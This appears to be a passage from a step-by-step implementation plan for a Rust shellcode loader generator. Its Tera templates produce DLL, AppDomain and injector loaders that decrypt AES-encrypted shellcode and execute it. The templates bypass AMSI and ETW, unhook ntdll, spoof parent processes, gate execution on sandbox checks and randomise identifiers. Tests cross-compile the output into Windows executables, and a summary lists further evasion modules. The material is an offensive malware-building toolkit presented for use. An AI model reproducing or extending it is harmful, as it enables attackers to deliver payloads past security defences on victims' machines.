
**Files:**
- Create: `template-engine/templates/dll.rs.tera`
- Create: `template-engine/templates/appdomain.rs.tera`
- Create: `template-engine/templates/injector.rs.tera`

- [ ] **Step 1: dll.rs.tera**

```rust
{# template-engine/templates/dll.rs.tera #}
extern crate scaffold;

#[no_mangle]
pub unsafe extern "system" fn DllMain(
    _: *mut core::ffi::c_void,
    reason: u32,
    _: *mut core::ffi::c_void,
) -> i32 {
    if reason == 1 { // DLL_PROCESS_ATTACH
        {{ rand_ident(len=12) }}();
    }
    1
}

#[no_mangle]
pub unsafe extern "system" fn DllRegisterServer() { {{ rand_ident(len=12) }}(); }

#[no_mangle]
pub unsafe extern "system" fn DllGetClassObject() { {{ rand_ident(len=12) }}(); }

unsafe fn {{ rand_ident(len=12) }}() {
    {%- if "AmsiHwbp" in config.features %}
    scaffold::bypass::amsi_hwbp::install_amsi_bypass();
    {%- endif %}
    {%- if "EtwHwbp" in config.features %}
    scaffold::bypass::etw_hwbp::install_etw_bypass();
    {%- endif %}
    {%- if "UnhookDisk" in config.features %}
    scaffold::evasion::unhook::unhook_ntdll_disk();
    {%- endif %}

    let {{ rand_ident(len=10) }}: &[u8] = &[
        {%- for byte in config.shellcode_hex | hex_bytes %}{{ byte }},{% endfor %}
    ];
    let {{ rand_ident(len=10) }}: [u8; 32] = [
        {%- for byte in config.key_hex | hex_bytes %}{{ byte }},{% endfor %}
    ];
    let {{ rand_ident(len=10) }}: [u8; 16] = [
        {%- for byte in config.iv_hex | hex_bytes %}{{ byte }},{% endfor %}
    ];
    let {{ rand_ident(len=10) }} = scaffold::crypto::decrypt_aes256(
        &{{ rand_ident(len=10) }}, &{{ rand_ident(len=10) }}, &{{ rand_ident(len=10) }}
    ).unwrap();
    scaffold::inject::exec::run_no_rwx(&{{ rand_ident(len=10) }});
}
```

Note: each `rand_ident()` call generates a NEW name. The template must use `v` vars for consistency within a scope.

- [ ] **Step 2: appdomain.rs.tera**

```rust
{# template-engine/templates/appdomain.rs.tera #}
extern crate scaffold;

#[no_mangle]
pub unsafe extern "system" fn DllMain(
    _: *mut core::ffi::c_void, reason: u32, _: *mut core::ffi::c_void,
) -> i32 {
    if reason == 1 {
        let {{ v.var_key }}_clr: &[u16] = &[
            {%- for c in config.appdomain_config.clr_version | utf16_bytes %}{{ c }},{% endfor %} 0,
        ];
        let {{ v.var_key }}_type: &[u16] = &[
            {%- for c in config.appdomain_config.type_name | utf16_bytes %}{{ c }},{% endfor %} 0,
        ];
        let {{ v.var_key }}_method: &[u16] = &[
            {%- for c in config.appdomain_config.method_name | utf16_bytes %}{{ c }},{% endfor %} 0,
        ];
        let {{ v.var_shellcode }}: &[u8] = &[
            {%- for byte in config.appdomain_config.assembly_hex | hex_bytes %}{{ byte }},{% endfor %}
        ];
        scaffold::inject::appdomain::load_assembly_appdomain(
            {{ v.var_key }}_clr,
            {{ v.var_shellcode }},
            {{ v.var_key }}_type,
            {{ v.var_key }}_method,
            &[0u16],
        );
    }
    1
}
```

- [ ] **Step 3: injector.rs.tera**

```rust
{# template-engine/templates/injector.rs.tera #}
#![windows_subsystem = "windows"]
extern crate scaffold;

fn main() {
    unsafe {
        {%- if "SandboxDomain" in config.features %}
        if !scaffold::sandbox::domain::is_domain_joined() { return; }
        {%- endif %}
        {%- if "PpidSpoof" in config.features %}
        let (h_proc, h_thread) = match scaffold::inject::ppid_spoof::spawn_with_ppid(
            b"{{ config.appdomain_config.target_process }}\0",
            b"explorer.exe\0",
        ) {
            Some(v) => v,
            None => return,
        };
        {%- endif %}
        let {{ v.var_shellcode }}: &[u8] = &[
            {%- for byte in config.shellcode_hex | hex_bytes %}{{ byte }},{% endfor %}
        ];
        let {{ v.var_key }}: [u8; 32] = [
            {%- for byte in config.key_hex | hex_bytes %}{{ byte }},{% endfor %}
        ];
        let {{ v.var_iv }}: [u8; 16] = [
            {%- for byte in config.iv_hex | hex_bytes %}{{ byte }},{% endfor %}
        ];
        let {{ rand_ident(len=10) }} = scaffold::crypto::decrypt_aes256(
            {{ v.var_shellcode }}, &{{ v.var_key }}, &{{ v.var_iv }}
        ).unwrap();
        scaffold::inject::threadless::inject_threadless(
            {{ config.appdomain_config.target_process | as_pid }},
            &{{ rand_ident(len=10) }},
        );
    }
}
```

- [ ] **Step 4: Write + run template rendering tests**

```rust
// template-engine/src/lib.rs (add to tests)
#[test]
fn test_dll_template_has_dll_main() {
    let config = LoaderConfig {
        loader_type: LoaderType::Dll,
        features: vec![Feature::AmsiHwbp],
        encryption: Encryption::Aes256,
        shellcode_hex: "cafebabe".into(),
        key_hex: "aa".repeat(32),
        iv_hex: "bb".repeat(16),
        pe_config: None,
        appdomain_config: None,
    };
    let source = generate_loader_source(&config).unwrap();
    assert!(source.contains("DllMain"));
    assert!(source.contains("DllRegisterServer"));
}
```

```bash
cargo test -p template-engine
```

Expected: all tests pass

- [ ] **Step 5: Commit**

```bash
git add template-engine/templates/
git commit -m "feat(template): dll, appdomain, injector Tera templates"
```

---

### Task 18: End-to-End Compilation Test

Verify: template → `loader-config.rs` → `rustc --extern scaffold` → Windows PE output.

**Files:**
- Create: `template-engine/tests/e2e.rs`

- [ ] **Step 1: Write end-to-end test**

```rust
// template-engine/tests/e2e.rs
use template_engine::*;
use std::process::Command;

#[test]
fn test_binary_template_compiles_for_windows() {
    // Generate source
    let config = LoaderConfig {
        loader_type: LoaderType::Binary,
        features: vec![Feature::AmsiHwbp, Feature::SleepEncrypt],
        encryption: Encryption::Aes256,
        shellcode_hex: "909090909090".into(), // NOP sled
        key_hex: format!("{:0>64}", "deadbeef"),
        iv_hex:  format!("{:0>32}", "cafebabe"),
        pe_config: None,
        appdomain_config: None,
    };
    let source = generate_loader_source(&config).unwrap();

    // Write to temp dir
    let tmp = std::env::temp_dir().join("defcrow_e2e_test");
    std::fs::create_dir_all(&tmp).unwrap();
    let src_path = tmp.join("loader_config.rs");
    std::fs::write(&src_path, &source).unwrap();

    // First: cargo check on scaffold to ensure libscaffold.rlib exists
    let scaffold_check = Command::new("cargo")
        .args(["build", "--release", "-p", "loader-scaffold",
               "--target", "x86_64-pc-windows-gnu"])
        .current_dir(env!("CARGO_MANIFEST_DIR").to_string() + "/..")
        .output()
        .unwrap();
    assert!(scaffold_check.status.success(),
        "scaffold build failed: {}", String::from_utf8_lossy(&scaffold_check.stderr));

    // Locate libscaffold.rlib
    let rlib = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .parent().unwrap()
        .join("target/x86_64-pc-windows-gnu/release/libscaffold.rlib");
    assert!(rlib.exists(), "libscaffold.rlib not found at {:?}", rlib);

    // Compile generated source against scaffold
    let out_path = tmp.join("loader.exe");
    let rustc = Command::new("rustc")
        .args([
            src_path.to_str().unwrap(),
            "--edition", "2021",
            "--target", "x86_64-pc-windows-gnu",
            "--extern", &format!("scaffold={}", rlib.display()),
            "-o", out_path.to_str().unwrap(),
            "-C", "opt-level=3",
            "-C", "lto=yes",
        ])
        .output()
        .unwrap();

    assert!(rustc.status.success(),
        "rustc failed:\nSTDOUT: {}\nSTDERR: {}",
        String::from_utf8_lossy(&rustc.stdout),
        String::from_utf8_lossy(&rustc.stderr));

    assert!(out_path.exists(), "output exe not created");

    // Verify it's a Windows PE (first 2 bytes = MZ header)
    let bytes = std::fs::read(&out_path).unwrap();
    assert_eq!(&bytes[0..2], b"MZ", "output is not a valid PE file");

    // Cleanup
    std::fs::remove_dir_all(&tmp).ok();
}
```

- [ ] **Step 2: Run end-to-end test**

```bash
cargo test -p template-engine --test e2e -- --nocapture
```

Expected:
```
running 1 test
test test_binary_template_compiles_for_windows ... ok
```

Note: First run is slow (~90s for scaffold build). Subsequent runs use Cargo cache.

- [ ] **Step 3: Final cross-compile check of entire workspace**

```bash
cargo check --target x86_64-pc-windows-gnu -p loader-scaffold
cargo test -p template-engine
cargo test -p loader-scaffold
```

Expected: all pass

- [ ] **Step 4: Final commit**

```bash
git add template-engine/tests/
git commit -m "test(e2e): template → rustc compile → Windows PE verification"
```

---

## Summary

After completing all 18 tasks:

- `loader-scaffold` compiles to `libscaffold.rlib` for `x86_64-pc-windows-gnu`
- All 15 OPSEC modules implemented: indirect syscalls, unhooking, fiber exec, Ekko sleep masking, stack spoof, AMSI/ETW HW breakpoint, sandbox checks, PPID spoof, module stomp, threadless injection, AppDomain CLR hosting
- `template-engine` generates randomized `loader-config.rs` via Tera templates
- End-to-end test validates template → rustc → valid Windows PE

**Next:** Plan 2/3 — `web-server` (Axum API + auth + build orchestration + WebSocket progress)
